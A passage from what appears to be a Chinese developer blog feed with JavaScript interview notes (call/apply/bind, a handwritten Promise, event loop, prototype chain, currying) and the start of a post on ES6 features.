punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">delete</span> context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// apply</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>apply <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>context<span class="token punctuation">,</span> argsArr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  context <span class="token operator">=</span> context <span class="token operator">||</span> window<span class="token punctuation">;</span>  <span class="token keyword">const</span> fnSymbol <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"fn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>argsArr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">delete</span> context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// bind</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>bind <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  context <span class="token operator">=</span> context <span class="token operator">||</span> window<span class="token punctuation">;</span>  <span class="token keyword">const</span> fnSymbol <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"fn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token operator">...</span>_args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    args <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>_args<span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">delete</span> context<span class="token punctuation">[</span>fnSymbol<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="（3）问：setTimeout-fn-0-多久才执行，Event-Loop"><a href="#（3）问：setTimeout-fn-0-多久才执行，Event-Loop" class="headerlink" title="（3）问：setTimeout(fn, 0)多久才执行，Event Loop"></a>（3）问：<code>setTimeout(fn, 0)</code>多久才执行，Event Loop</h2><p>setTimeout 按照顺序放到队列里面，然后等待函数调用栈清空之后才开始执行，而这些操作进入队列的顺序，则由设定的延迟时间来决定</p><h2 id="手写题：Promise-原理"><a href="#手写题：Promise-原理" class="headerlink" title="手写题：Promise 原理"></a>手写题：Promise 原理</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">MyPromise</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>resolvedCallbacks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>rejectedCallbacks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'PENDING'</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resolve<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>reject<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token string">'PENDING'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'RESOLVED'</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>resolvedCallbacks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>cb <span class="token operator">=</span><span class="token operator">></span> <span class="token function">cb</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">reject</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token string">'PENDING'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'REJECTED'</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>rejectedCallbacks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>cb <span class="token operator">=</span><span class="token operator">></span> <span class="token function">cb</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">then</span><span class="token punctuation">(</span>onFulfilled<span class="token punctuation">,</span> onRejected<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token string">'PENDING'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>resolvedCallbacks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>onFulfilled<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>rejectedCallbacks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>onRejected<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token string">'RESOLVED'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">onFulfilled</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token string">'REJECTED'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">onRejected</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问：js脚本加载问题，async、defer问题"><a href="#问：js脚本加载问题，async、defer问题" class="headerlink" title="问：js脚本加载问题，async、defer问题"></a>问：js脚本加载问题，async、defer问题</h2><ul><li>如果依赖其他脚本和 DOM 结果，使用 defer</li><li>如果与 DOM 和其他脚本依赖不强时，使用 async</li></ul><h2 id="问：如何判断一个对象是不是空对象？"><a href="#问：如何判断一个对象是不是空对象？" class="headerlink" title="问：如何判断一个对象是不是空对象？"></a>问：如何判断一个对象是不是空对象？</h2><p>Object.keys(obj).length === 0</p><p>手写题：在线编程，getUrlParams(url,key); 就是很简单的获取url的某个参数的问题，但要考虑边界情况，多个返回值等等</p><h2 id="问：-lt-script-src-’xxx’-’xxx’-gt-外部js文件先加载还是onload先执行，为什么？"><a href="#问：-lt-script-src-’xxx’-’xxx’-gt-外部js文件先加载还是onload先执行，为什么？" class="headerlink" title="问：&lt;script src=’xxx’ ’xxx’/&gt;外部js文件先加载还是onload先执行，为什么？"></a>问：&lt;script src=’xxx’ ’xxx’/&gt;外部js文件先加载还是onload先执行，为什么？</h2><p>onload 是所以加载完成之后执行的</p><h2 id="问：怎么加事件监听，两种"><a href="#问：怎么加事件监听，两种" class="headerlink" title="问：怎么加事件监听，两种"></a>问：怎么加事件监听，两种</h2><p>onclick 和 addEventListener</p><h2 id="问：事件传播机制（事件流）"><a href="#问：事件传播机制（事件流）" class="headerlink" title="问：事件传播机制（事件流）"></a>问：事件传播机制（事件流）</h2><p>冒泡和捕获</p><h2 id="（4）问：说一下原型链和原型链的继承吧"><a href="#（4）问：说一下原型链和原型链的继承吧" class="headerlink" title="（4）问：说一下原型链和原型链的继承吧"></a>（4）问：说一下原型链和原型链的继承吧</h2><ul><li>所有普通的 [[Prototype]] 链最终都会指向内置的 Object.prototype，其包含了 JavaScript 中许多通用的功能</li><li>为什么能创建 “类”，借助一种特殊的属性：所有的函数默认都会拥有一个名为 prototype 的共有且不可枚举的属性，它会指向另外一个对象，这个对象通常被称为函数的原型</li></ul><pre><code>function Person(name) {  this.name = name;}Person.prototype.constructor = Person</code></pre><ul><li>在发生 new 构造函数调用时，会将创建的新对象的 [[Prototype]] 链接到 Person.prototype 指向的对象，这个机制就被称为原型链继承</li><li>方法定义在原型上，属性定义在构造函数上</li><li>首先要说一下 JS 原型和实例的关系：每个构造函数 （constructor）都有一个原型对象（prototype），这个原型对象包含一个指向此构造函数的指针属性，通过 new 进行构造函数调用生成的实例，此实例包含一个指向原型对象的指针，也就是通过 [[Prototype]] 链接到了这个原型对象</li><li>然后说一下 JS 中属性的查找：当我们试图引用实例对象的某个属性时，是按照这样的方式去查找的，首先查找实例对象上是否有这个属性，如果没有找到，就去构造这个实例对象的构造函数的 prototype 所指向的对象上去查找，如果还找不到，就从这个 prototype 对象所指向的构造函数的 prototype 原型对象上去查找</li><li>什么是原型链：这样逐级查找形似一个链条，且通过 [[Prototype]] 属性链接，所以被称为原型链</li><li>什么是原型链继承，类比类的继承：当有两个构造函数 A 和 B，将一个构造函数 A 的原型对象的，通过其 [[Prototype]] 属性链接到另外一个 B 构造函数的原型对象时，这个过程被称之为原型继承。</li></ul><h3 id="标准答案更正确的解释"><a href="#标准答案更正确的解释" class="headerlink" title="标准答案更正确的解释"></a>标准答案更正确的解释</h3><p><strong>什么是原型链？</strong></p><p>当对象查找一个属性的时候，如果没有在自身找到，那么就会查找自身的原型，如果原型还没有找到，那么会继续查找原型的原型，直到找到 Object.prototype 的原型时，此时原型为 null，查找停止。这种通过 通过原型链接的逐级向上的查找链被称为原型链</p><p><strong>什么是原型继承？</strong></p><p>一个对象可以使用另外一个对象的属性或者方法，就称之为继承。具体是通过将这个对象的原型设置为另外一个对象，这样根据原型链的规则，如果查找一个对象属性且在自身不存在时，就会查找另外一个对象，相当于一个对象可以使用另外一个对象的属性和方法了。</p><h2 id="问：说下对-JS-的了解吧"><a href="#问：说下对-JS-的了解吧" class="headerlink" title="问：说下对 JS 的了解吧"></a>问：说下对 JS 的了解吧</h2><p>是基于原型的动态语言，主要独特特性有 this、原型和原型链。</p><p>JS 严格意义上来说分为：语言标准部分（ECMAScript）+ 宿主环境部分</p><h3 id="语言标准部分"><a href="#语言标准部分" class="headerlink" title="语言标准部分"></a>语言标准部分</h3><p>2015 年发布 ES6，引入诸多新特性使得能够编写大型项目变成可能，标准自 2015 之后以年号代号，每年一更</p><h3 id="宿主环境部分"><a href="#宿主环境部分" class="headerlink" title="宿主环境部分"></a>宿主环境部分</h3><ul><li>在浏览器宿主环境包括 DOM + BOM 等</li><li>在 Node，宿主环境包括一些文件、数据库、网络、与操作系统的交互等</li></ul><h2 id="问：数组能够调用的函数有那些？"><a href="#问：数组能够调用的函数有那些？" class="headerlink" title="问：数组能够调用的函数有那些？"></a>问：数组能够调用的函数有那些？</h2><ul><li>push</li><li>pop</li><li>splice</li><li>slice</li><li>shift</li><li>unshift</li><li>sort</li><li>find</li><li>findIndex</li><li>map/filter/reduce 等函数式编程方法</li><li>还有一些原型链上的方法：toString/valudOf</li></ul><h2 id="问：如何判断数组类型"><a href="#问：如何判断数组类型" class="headerlink" title="问：如何判断数组类型"></a>问：如何判断数组类型</h2><p>Array.isArray</p><h2 id="问：函数中的arguments是数组吗？类数组转数组的方法了解一下？"><a href="#问：函数中的arguments是数组吗？类数组转数组的方法了解一下？" class="headerlink" title="问：函数中的arguments是数组吗？类数组转数组的方法了解一下？"></a>问：函数中的arguments是数组吗？类数组转数组的方法了解一下？</h2><p>是类数组，是属于鸭子类型的范畴，长得像数组，</p><ul><li>… 运算符</li><li>Array.from</li><li>Array.prototype.slice.apply(arguments)</li></ul><h2 id="问：用过-TypeScript-吗？它的作用是什么？"><a href="#问：用过-TypeScript-吗？它的作用是什么？" class="headerlink" title="问：用过 TypeScript 吗？它的作用是什么？"></a>问：用过 TypeScript 吗？它的作用是什么？</h2><p>为 JS 添加类型支持，以及提供最新版的 ES 语法的支持，是的利于团队协作和排错，开发大型项目</p><h2 id="问：PWA使用过吗？serviceWorker的使用原理是啥？"><a href="#问：PWA使用过吗？serviceWorker的使用原理是啥？" class="headerlink" title="问：PWA使用过吗？serviceWorker的使用原理是啥？"></a>问：PWA使用过吗？serviceWorker的使用原理是啥？</h2><p><code>渐进式网络应用（PWA）</code>是谷歌在2015年底提出的概念。基本上算是web应用程序，但在外观和感觉上与<code>原生app</code>类似。支持<code>PWA</code>的网站可以提供脱机工作、推送通知和设备硬件访问等功能。</p><p><code>Service Worker</code>是浏览器在后台独立于网页运行的脚本，它打开了通向不需要网页或用户交互的功能的大门。现在，它们已包括如推送通知和后台同步等功能。将来，<code>Service Worker</code>将会支持如定期同步或地理围栏等其他功能。本教程讨论的核心功能是拦截和处理网络请求，包括通过程序来管理缓存中的响应。</p><h2 id="问：ES6-之前使用-prototype-实现继承"><a href="#问：ES6-之前使用-prototype-实现继承" class="headerlink" title="问：ES6 之前使用 prototype 实现继承"></a>问：ES6 之前使用 prototype 实现继承</h2><p>Object.create() 会创建一个 “新” 对象，然后将此对象内部的 [[Prototype]] 关联到你指定的对象（Foo.prototype）。Object.create(null) 创建一个空 [[Prototype]] 链接的对象，这个对象无法进行委托。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">}</span>Foo<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myName <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 继承属性，通过借用构造函数调用</span><span class="token keyword">function</span> <span class="token function">Bar</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> label<span class="token punctuation">)</span> <span class="token punctuation">{</span>  Foo<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>label <span class="token operator">=</span> label<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 继承方法，创建备份</span>Bar<span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>Foo<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 必须设置回正确的构造函数，要不然在会发生判断类型出错</span>Bar<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Bar<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 必须在上一步之后</span>Bar<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myLabel <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>label<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"obj a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">myName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "a"</span>a<span class="token punctuation">.</span><span class="token function">myLabel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "obj a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问-如果一个构造函数，bind了一个对象，用这个构造函数创建出的实例会继承这个对象的属性吗？为什么？"><a href="#问-如果一个构造函数，bind了一个对象，用这个构造函数创建出的实例会继承这个对象的属性吗？为什么？" class="headerlink" title="问:如果一个构造函数，bind了一个对象，用这个构造函数创建出的实例会继承这个对象的属性吗？为什么？"></a>问:如果一个构造函数，bind了一个对象，用这个构造函数创建出的实例会继承这个对象的属性吗？为什么？</h2><p>不会继承，因为根据 this 绑定四大规则，new 绑定的优先级高于 bind 显示绑定，通过 new 进行构造函数调用时，会创建一个新对象，这个新对象会代替 bind 的对象绑定，作为此函数的 this，并且在此函数没有返回对象的情况下，返回这个新建的对象</p><h2 id="3-箭头函数和普通函数有啥区别？箭头函数能当构造函数吗？"><a href="#3-箭头函数和普通函数有啥区别？箭头函数能当构造函数吗？" class="headerlink" title="(3)箭头函数和普通函数有啥区别？箭头函数能当构造函数吗？"></a>(3)箭头函数和普通函数有啥区别？箭头函数能当构造函数吗？</h2><ul><li><p>普通函数通过 function 关键字定义， this 无法结合词法作用域使用，在运行时绑定，只取决于函数的调用方式，在哪里被调用，调用位置。（取决于调用者，和是否独立运行）</p></li><li><p>箭头函数使用被称为 “胖箭头” 的操作 <code>=&gt;</code> 定义，箭头函数不应用普通函数 this 绑定的四种规则，而是根据外层（函数或全局）的作用域来决定 this，且箭头函数的绑定无法被修改（new 也不行）。</p></li><li><p>箭头函数常用于回调函数中，包括事件处理器或定时器</p></li><li><p>箭头函数和 var self = this，都试图取代传统的 this 运行机制，将 this 的绑定拉回到词法作用域</p></li><li><p>没有原型、没有 this、没有 super，没有 arguments，没有 new.target</p></li><li><p>不能通过 new 关键字调用</p></li><li><ul><li>一个函数内部有两个方法：[[Call]] 和 [[Construct]]，在通过 new 进行函数调用时，会执行 [[construct]] 方法，创建一个实例对象，然后再执行这个函数体，将函数的 this 绑定在这个实例对象上</li><li>当直接调用时，执行 [[Call]] 方法，直接执行函数体</li><li>箭头函数没有 [[Construct]] 方法，不能被用作构造函数调用，当使用 new 进行函数调用时会报错。</li></ul></li></ul><pre><code>function foo() {  return (a) =&gt; {    console.log(this.a);  }}var obj1 = {  a: 2}var obj2 = {  a: 3 }var bar = foo.call(obj1);bar.call(obj2);</code></pre><h2 id="问：知道-ES6-的-Class-嘛？Static-关键字有了解嘛"><a href="#问：知道-ES6-的-Class-嘛？Static-关键字有了解嘛" class="headerlink" title="问：知道 ES6 的 Class 嘛？Static 关键字有了解嘛"></a>问：知道 ES6 的 Class 嘛？Static 关键字有了解嘛</h2><p>为这个类的函数对象直接添加方法，而不是加在这个函数对象的原型对象上</p><h2 id="（3）问：事件循环机制-（Event-Loop）"><a href="#（3）问：事件循环机制-（Event-Loop）" class="headerlink" title="（3）问：事件循环机制 （Event Loop）"></a>（3）问：事件循环机制 （Event Loop）</h2><p>事件循环机制从整体上告诉了我们 JavaScript 代码的执行顺序 <code>Event Loop</code>即事件循环，是指浏览器或<code>Node</code>的一种解决<code>javaScript</code>单线程运行时不会阻塞的一种机制，也就是我们经常使用<strong>异步</strong>的原理。</p><p>先执行宏任务队列，然后执行微任务队列，然后开始下一轮事件循环，继续先执行宏任务队列，再执行微任务队列。</p><ul><li>宏任务：script/setTimeout/setInterval/setImmediate/ I/O / UI Rendering</li><li>微任务：process.nextTick()/Promise</li></ul><p>上诉的 setTimeout 和 setInterval 等都是任务源，真正进入任务队列的是他们分发的任务。</p><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><ul><li>setTimeout = setInterval 一个队列</li><li>setTimeout &gt; setImmediate</li><li>process.nextTick &gt; Promise</li></ul><pre><code>for (const macroTask of macroTaskQueue) {    handleMacroTask();      for (const microTask of microTaskQueue) {       handleMicroTask(microTask);    }}</code></pre><h2 id="（2）手写题：数组扁平化"><a href="#（2）手写题：数组扁平化" class="headerlink" title="（2）手写题：数组扁平化"></a>（2）手写题：数组扁平化</h2><pre><code>function flatten(arr) {  let result = [];  for (let i = 0; i &lt; arr.length; i++) {    if (Array.isArray(arr[i])) {      result = result.concat(flatten(arr[i]));    } else {      result = result.concat(arr[i]);    }  }  return result;}const a = [1, [2, [3, 4]]];console.log(flatten(a));</code></pre><h2 id="手写题：实现柯里化"><a href="#手写题：实现柯里化" class="headerlink" title="手写题：实现柯里化"></a>手写题：实现柯里化</h2><p>预先设置一些参数</p><p>柯里化是什么：是指这样一个函数，它接收函数 A，并且能返回一个新的函数，这个新的函数能够处理函数 A 的剩余参数</p><pre><code>function createCurry(func, args) {  var argity = func.length;  var args = args || [];  return function () {    var _args = [].slice.apply(arguments);    args.push(..._args);    if (args.length &lt; argity) {      return createCurry.call(this, func, args);    }    return func.apply(this, args);  }}</code></pre><h2 id="手写题：数组去重"><a href="#手写题：数组去重" class="headerlink" title="手写题：数组去重"></a>手写题：数组去重</h2><pre><code>Array.from(new Set([1, 1, 2, 2]))</code></pre><h2 id="问：let-闭包"><a href="#问：let-闭包" class="headerlink" title="问：let 闭包"></a>问：let 闭包</h2><p>let 会产生临时性死区，在当前的执行上下文中，会进行变量提升，但是未被初始化，所以在执行上下文执行阶段，执行代码如果还没有执行到变量赋值，就引用此变量就会报错，此变量未初始化。</p><h2 id="问：变量提升"><a href="#问：变量提升" class="headerlink" title="问：变量提升"></a>问：变量提升</h2><p>函数在运行的时候，会首先创建执行上下文，然后将执行上下文入栈，然后当此执行上下文处于栈顶时，开始运行执行上下文。</p><p>在创建执行上下文的过程中会做三件事：创建变量对象，创建作用域链，确定 this 指向，其中创建变量对象的过程中，首先会为 arguments 创建一个属性，值为 arguments，然后会扫码 function 函数声明，创建一个同名属性，值为函数的引用，接着会扫码 var 变量声明，创建一个同名属性，值为 undefined，这就是变量提升 ** <strong>问：</strong>如何看待 PWA App、原生 App 以及 Flutter 和 React Native 这种前端驱动的开发模式？</p><h2 id="instance-如何使用"><a href="#instance-如何使用" class="headerlink" title="instance 如何使用"></a>instance 如何使用</h2><p>左边可以是任意值，右边只能是函数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">'hello tuture'</span> <span class="token keyword">instanceof</span> <span class="token class-name">String</span> <span class="token comment" spellcheck="true">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES新特性</title>
      <link href="2021/04/27/ES%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>2021/04/27/ES%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="ES6（2015）"><a href="#ES6（2015）" class="headerlink" title="ES6（2015）"></a>ES6（2015）</h2><h3 id="1-类（class）"><a href="#1-类（class）" class="headerlink" title="1. 类（class）"></a>1. 类（class）</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Man</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'小豪'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">console</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> man <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Man</span><span class="token punctuation">(</span><span class="token string">'小豪'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>man<span class="token punctuation">.</span><span class="token function">console</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 小豪</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-模块化-ES-Module"><a href="#2-模块化-ES-Module" class="headerlink" title="2. 模块化(ES Module)"></a>2. 模块化(ES Module)</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 模块 A 导出一个方法</span><span class="token keyword">export</span> <span class="token keyword">const</span> sub <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 模块 B 导入使用</span><span class="token keyword">import</span> <span class="token punctuation">{</span> sub <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./A'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-箭头（Arrow）函数"><a href="#3-箭头（Arrow）函数" class="headerlink" title="3. 箭头（Arrow）函数"></a>3. 箭头（Arrow）函数</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> func <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-函数参数默认值"><a href="#4-函数参数默认值" class="headerlink" title="4. 函数参数默认值"></a>4. 函数参数默认值</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>age <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// ...}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-模板字符串"><a 